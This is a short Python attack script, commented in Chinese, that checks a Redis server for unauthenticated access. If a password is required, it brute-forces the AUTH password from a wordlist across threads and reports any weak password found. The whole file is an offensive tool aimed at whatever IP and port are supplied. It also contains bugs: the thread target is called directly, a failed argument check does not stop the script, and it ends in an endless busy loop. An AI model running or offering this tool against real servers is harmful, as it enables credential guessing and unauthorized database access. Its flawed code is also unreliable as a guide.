#!/usr/bin/python
# -*- coding:utf-8 -*-

"""
    描述：redis未授权访问探测 + 密码爆破
    author: chen
    date: 2021-07-03
"""


import socket
import sys
import threading
import queue
import os


def poc():
    global flag
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”
    s.send('INFO\r\n'.encode('utf-8'))
    result = s.recv(1024).decode('utf-8')
    if "redis_version" in result:
        print("存在redis未授权访问漏洞！")
        flag = True
    elif "Authentication" in result:
        flag = False
    else:
        print("未知错误")
        flag = None
    s.close()


def burst():
    while not q.empty():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        _pass = q.get()
        msg = "AUTH " + _pass + "\r\n"          # AUTH pass 为redis密码格式
        s.send(msg.encode('utf-8'))
        result = s.recv(1024).decode('utf-8')
        if '+OK' in result:
            print("存在弱口令，密码为%s" % _pass)
            exit()


if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("请按照格式输出：\n")
        print("redis.py 10.10.10.10 6379 字典名 线程数 \n")

    flag = True
    q = queue.Queue()

    ip = sys.argv[1]
    port = int(sys.argv[2])
    dic = sys.argv[3]
    thread = sys.argv[4]

    poc()

    if flag:
        exit()
    else:
        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录
        for i in open(path + '/' + dic):
            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格
        for i in range(int(thread)):
            t = threading.Thread(target=burst(), daemon=True)
            t.start()

    while True:
        pass


